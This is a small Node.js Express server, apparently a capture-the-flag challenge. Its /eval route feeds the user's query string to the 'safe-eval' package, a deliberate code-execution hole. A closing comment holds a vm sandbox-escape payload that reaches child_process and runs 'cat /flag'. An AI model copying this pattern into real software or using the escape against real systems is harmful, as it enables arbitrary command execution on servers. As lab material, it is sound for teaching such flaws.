const express = require('express');
let path = require('path');
let bodyParser = require('body-parser');
let eval = require('safe-eval');

// Constants
const PORT = 8080;
const HOST = '0.0.0.0';

// App
const app = express();

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

app.use(express.static('static'))

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '/static/index.html'));
});


app.post('/eval_to_json', (req, res) => {
  if (req.body && req.body.eval){
    try {
      var ss = req.body.eval
      //var ss = eval(req.body.eval);
      res.end(JSON.stringify(ss));
    } catch(err) {
      res.end(err.toString());
    }
    
  }
});

app.get('/eval',function(req,res){
  res.send(eval(req.query.q));
  console.log(req.query.q);
})


app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);


/*
"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('cat /flag').toString()`);
console.log(xyz);*/
